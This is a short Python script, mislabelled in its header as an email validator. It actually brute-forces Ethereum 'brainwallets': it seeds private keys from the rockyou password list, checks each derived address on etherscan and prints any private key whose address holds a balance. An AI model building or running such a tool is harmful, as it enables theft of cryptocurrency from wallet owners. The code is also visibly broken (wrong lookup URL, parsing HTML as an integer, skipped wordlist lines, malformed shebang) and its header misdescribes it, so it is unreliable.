#!/usr/bin/env python 3+
# -*- coding: utf-8 -*-
#
#  getit.py
#  multi-threading email check format validation and online existence
#  
#  Copyright 2021 geek <geek@KALIBOX>
#  
# ******** TO DO COMMENT LINE args ******************

import sys, getopt, requests, time, blocksmith
import concurrent.futures
#from validate_email import validate_email

count=0
okcount=0
kg = blocksmith.KeyGenerator()





def check_key(thekey):
	thekey=thekey.strip()
	kg.seed_input(thekey)
	privatekey = kg.generate_key()
	publickey = blocksmith.EthereumWallet.generate_address(privatekey)
	print(f'Private: {privatekey} Public:{publickey}')
	#print(f'This the key: {thekey} and {privatekey}')
	#https://etherscan.io/tx/0x8ecbb476d23778fde37464eb99f6c1c17b4b0e9dcc4f26c8f62e32da37061590
	#	r = requests.get("https://www.blockchain.com/eth/address/"+publickey)
	#r=w3.eth.get_balance('0x6Ff92dB0505BfE5D76FD27ACe9a69adBAc5771Ff')

	r = requests.get("https://etherscan.io/tx/"+publickey)
	print(r.text)
	if int(r.text) > 0:
		print("Ether Address is:", publickey)
		print("Private Key is: ", privatekey)
		print("Balance is: ",r.text)
		exit()
	else:
		print(f'{thekey} has {r.text} == nope')
	return True
	
with open('/usr/share/dict/rockyou.txt','r') as a_file:
	for line in a_file:
		thekey=a_file.readline()
		count+=1
		with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
			if executor.submit(check_key, thekey):
				okcount+=1
	print(f'\033[0mFinished: Total: {count} Existing: {okcount}')
